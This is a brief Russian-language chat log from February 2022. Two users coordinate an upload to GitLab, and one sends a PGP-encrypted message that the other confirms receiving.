[21.02.22 10:51:34] collin:		сможешь?
[21.02.22 10:51:39] geraldo:		Хорошо. Да, смогу
[21.02.22 10:51:42] collin:		ок
[21.02.22 15:13:55] geraldo:		Загрузил на gitlab все последние изменения
[21.02.22 15:26:06] collin:		-----BEGIN PGP MESSAGE-----

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
ZhM8WZ4JEdDjpJOG
=5z9U
-----END PGP MESSAGE-----
[21.02.22 15:26:07] collin:		подтверди получение
[21.02.22 15:29:57] geraldo:		Принято!
